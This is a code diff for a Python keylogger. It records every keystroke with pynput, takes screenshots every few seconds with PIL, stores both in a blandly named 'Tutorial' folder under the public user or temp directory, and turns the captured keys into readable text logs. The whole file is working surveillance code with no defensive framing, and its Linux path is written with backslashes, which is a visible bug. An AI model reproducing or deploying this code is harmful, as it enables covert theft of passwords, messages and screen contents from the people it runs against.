@@ -1,33 +1,103 @@
-import pathlib
+# Import built-in modules #
+import logging, pathlib, re, time
+import os
+from multiprocessing import Process
+
+# Import third-party modules #
 from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
-from multiprocessing import Process
-import random
-import logging
-import time
-import re
 
-def on_press(key):
+'''
+################
+Function Index #
+########################################################################################################################
+OnPress - For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape
+          is pressed, otherwise append the entered key to the key capture list to form sentence.
+Screenshots - Loop that actively takes screenshots.         
+RegexFormatting - Parses the logged pynput keys into into human readable format.
+main - Facilitates key listener thread and screenshot capture.
+########################################################################################################################
+'''
+
+# Pseudo constants #
+WAIT_TIME = 3
+
+# Global variables #
+global command_file, screenshot
+last_pic = 0
+
+
+'''
+########################################################################################################################
+Name:       OnPress
+Purpose:    For key listener, write sentence to file if enter is pressed, kill screenshot capturing process if escape
+            is pressed, otherwise append the entered key to the key capture list to form sentence.
+Parameters: The key that the key listener detected the user pressed.
+Returns:    Nothing on enter key, boolean false on escape key, otherwise the keys capture list with new member.
+########################################################################################################################
+'''
+def OnPress(key):
     global command_file, keys, screenshot
 
+    # If the enter key was pressed #
     if key == Key.enter:
+        # Write the sentence logged in keys capture list to file #
         command_file.write(str(keys) + '\n\n')
         del keys[:]
+    # If the escape key was pressed #
     elif key == Key.esc:
+        # Kill the screenshot capturing process #
         screenshot.terminate()
         return False
+    # If the key is intended to be recorded #
     else:
         keys.append(key)
         return keys
 
-def screenshots(file_path):
-    for x in range(0, 120):
-        pic = ImageGrab.grab()
-        pic.save(file_path + str(random.randrange(1,600)) + '.png')
-        time.sleep(5)           
 
-def regex_formating(file_path):
-    regex = re.compile(r'(?:(^\[)|([\',])|(\]$))')
+'''
+########################################################################################################################
+Name:       Screenshots
+Purpose:    Loop that actively takes screenshots.
+Parameters: Path to local storage for files.
+Returns: None
+########################################################################################################################
+'''
+def Screenshots(path: str):
+    global last_pic
+
+    while True:
+        # Take a screenshot #
+        pic = ImageGrab.grab()
+
+        while True:
+            # Format screenshot to number of last capture #
+            pic_path = f'{path}Screenshot{last_pic}.png'
+
+            # If file name is unique #
+            if not os.path.isfile(pic_path):
+                # Save the picture as png #
+                pic.save(pic_path)
+                # Increment static count #
+                last_pic += 1
+                break
+
+            # Increment static count #
+            last_pic += 1
+
+        time.sleep(WAIT_TIME)
+
+
+'''
+########################################################################################################################
+Name:       RegexFormatting
+Purpose:    Parses the logged pynput keys into into human readable format.
+Parameters: Path to local storage for files.
+Returns:    None
+########################################################################################################################
+'''
+def RegexFormatting(path):
+    regex = re.compile(r'(?:(^\[)|([\',])|(]$))')
     regex2 = re.compile(r'''<Key\.
                             (?:ctrl|shift|alt|caps_lock|
                             tab|cmd|home|insert|delete|
@@ -42,47 +112,66 @@ def regex_formating(file_path):
     regex4 = re.compile(r'.<Key\.backspace:<8>>')
     regex5 = re.compile(r'<Key\.space:>')
 
-    with open(file_path + 'keys.txt') as command_file:
-        for line in command_file:
+    with open(path + 'keys.txt') as parse_file:
+        for line in parse_file:
             sub = re.sub(regex, r'', str(line))
             sub2 = re.sub(regex2, r'', str(sub))
             sub3 = re.sub(regex3, r'', str(sub2))
             sub4 = re.sub(regex4, r'', str(sub3))
             result = re.sub(regex5, r' ', str(sub4))
-            with open(file_path + 'commands.txt', 'a') as final_log:
+            with open(path + 'commands.txt', 'a') as final_log:
                 final_log.write(result)
 
+
+'''
+########################################################################################################################
+Name:       main
+Purpose:    Facilitates key listener thread and screenshot capture.
+Parameters: None
+Returns:    None
+########################################################################################################################
+'''
 def main():
     global command_file, screenshot
 
     input('Please hit enter to begin\n')
 
-    with open(file_path + 'keys.txt', 'a') as command_file:
-        key_listener = Listener(on_press=on_press)
-        screenshot = Process(target=screenshots, args=(file_path,))
+    with open(f'{file_path}keys.txt', 'a') as command_file:
+        # Create the key listener and screenshot taker #
+        key_listener = Listener(on_press=OnPress)
+        screenshot = Process(target=Screenshots, args=(file_path,))
+
+        # Start the processes #
         key_listener.start()
         screenshot.start()
-        
+
+        # Join the processes #
         key_listener.join(600.0)
         screenshot.join(timeout=600)
 
-    regex_formating(file_path)
+    RegexFormatting(file_path)
 
     main()
 
 
 if __name__ == '__main__':
-    try:
-        pathlib.Path('C:/Users/Public/Tutorial')\
-                .mkdir(parents=True, exist_ok=True)
-        
-        file_path = 'C:\\Users\\Public\\Tutorial\\'
-        keys = []
+    keys = []
 
+    # If OS is Windows #
+    if os.name == 'nt':
+        # Create storage directory #
+        pathlib.Path('C:/Users/Public/Tutorial').mkdir(parents=True, exist_ok=True)
+        file_path = 'C:\\Users\\Public\\Tutorial\\'
+    # Linux #
+    else:
+        # Create storage directory #
+        pathlib.Path('/tmp/Tutorial').mkdir(parents=True, exist_ok=True)
+        file_path = '\\tmp\\Tutorial\\'
+
+    try:
         main()
 
     except KeyboardInterrupt:
         print('* Ctrl-C detected ... exiting program *')
-
     except Exception as ex:
         logging.exception('* Error Ocurred: {} *'.format(ex))
